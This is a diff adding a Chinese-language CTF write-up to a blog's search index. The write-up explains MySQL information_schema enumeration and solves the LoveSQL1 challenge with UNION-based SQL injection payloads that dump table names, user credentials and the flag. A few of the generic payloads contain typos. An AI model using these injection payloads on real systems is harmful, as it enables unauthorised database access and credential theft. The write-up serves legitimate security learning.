@@ -2821,4 +2821,76 @@
         <tag>密码学</tag>
       </tags>
   </entry>
+  <entry>
+    <title>web-01</title>
+    <url>/2021/11/11/web-01/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    数据库存储的数据按照下文的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数 据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p>
+<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>查询检查下数据库:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/1.png" alt></p>
+<p>选择用mysql来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql</span><br></pre></td></tr></table></figure>
+<p>查看这个数据库中有哪些表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/2.png" alt="2"></p>
+<p>现在我们可以看到这里有24张表，然后我们来看下这张表的结构。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc db;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/3.png" alt></p>
+<p>在继续进行前台攻击时，我们想讨论下系统数据库，即 information_schema。所以我们使用它</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use information_schema</span><br><span class="line">show tables;</span><br><span class="line">desc tables; #枚举这张表</span><br></pre></td></tr></table></figure>
+<p>使用查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema = &quot;mysql&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/4.png" alt="4"></p>
+<p>使用这个查询，我们可以下载到表名。</p>
+<p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， </p>
+<p>我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p>
+<p>猜数据库 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata </span><br></pre></td></tr></table></figure>
+<p>猜某库的数据表 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’ </span><br></pre></td></tr></table></figure>
+<p>猜某表的所有列 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’ </span><br></pre></td></tr></table></figure>
+<p>获取某列的内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select *** from ****</span><br></pre></td></tr></table></figure>
+<h1 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h1><p>查询库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+<p>查询表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name)from information.schema_tables where table_schema=database();--+</span><br></pre></td></tr></table></figure>
+<p>查询字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(column_name)from information.schema_columns where table_name=&#x27;数据库表的名字&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(一个或多个字段名，逗号分隔)from 表名 --+</span><br></pre></td></tr></table></figure>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="极客大挑战-2019-LoveSQL1"><a href="#极客大挑战-2019-LoveSQL1" class="headerlink" title="[极客大挑战 2019]LoveSQL1"></a>[极客大挑战 2019]LoveSQL1</h2><p><img src="/2021/11/11/web-01/5.png" alt="5"></p>
+<p>先查询字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&#x27; order by 3%23&amp;password=1 </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/8.png" alt="8"></p>
+<p>再试试order by 4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&#x27; order by 4%23&amp;password=1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/9.png" alt="9"></p>
+<p>可知共3个字段。使用联合查询，结合第一步查出来的字段数，构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=1&#x27; union select null,null,(select database())%23&amp;password=2</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/10-16367305385491.png" alt="10"></p>
+<p>所以数据库名是geek，因此查表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=1&#x27; union select null,null,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;geek&#x27;)%23&amp;password=2</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/11.png" alt="11"></p>
+<p>所以这个数据库里有两个表：geekuser,l0ve1ysq1</p>
+<p>现在，已知两个表，我们一个一个进行查列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=1&#x27; union select null,null,( select group_concat( column_name ) from information_schema.columns where table_name=&#x27;geekuser&#x27;)%23&amp;password=2</span><br><span class="line">check.php?username=1&#x27; union select null,null,( select group_concat( column_name ) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;)%23&amp;password=2</span><br></pre></td></tr></table></figure>
+<p>二者都是得到</p>
+<p><img src="/2021/11/11/web-01/12.png" alt="12"></p>
+<p>现在是查数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=1&#x27; union select null,null,group_concat(id,0x3a,username,0x3a,password) from geek.geekuser%23&amp;password=2</span><br><span class="line">check.php?username=1&#x27; union select null,null,group_concat(id,0x3a,username,0x3a,password) from geek.l0ve1ysq1%23&amp;password=2</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/11/web-01/13.png" alt="13"></p>
+<p>得到一串很像flag的字符串，但显示不完整，把整段复制下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your password is &#x27;1:cl4y:wo_tai_nan_le,2:glzjin:glzjin_wants_a_girlfriend,3:Z4cHAr7zCr:biao_ge_dddd_hm,4:0xC4m3l:linux_chuang_shi_ren,5:Ayrain:a_rua_rain,6:Akko:yan_shi_fu_de_mao_bo_he,7:fouc5:cl4y,8:fouc5:di_2_kuai_fu_ji,9:fouc5:di_3_kuai_fu_ji,10:fouc5:di_4_kuai_fu_ji,11:fouc5:di_5_kuai_fu_ji,12:fouc5:di_6_kuai_fu_ji,13:fouc5:di_7_kuai_fu_ji,14:fouc5:di_8_kuai_fu_ji,15:leixiao:Syc_san_da_hacker,16:flag:flag&#123;0aabd4de-ed0b-4aa7-abe9-399364e2f5b0&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<p>提取flag字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;0aabd4de-ed0b-4aa7-abe9-399364e2f5b0&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
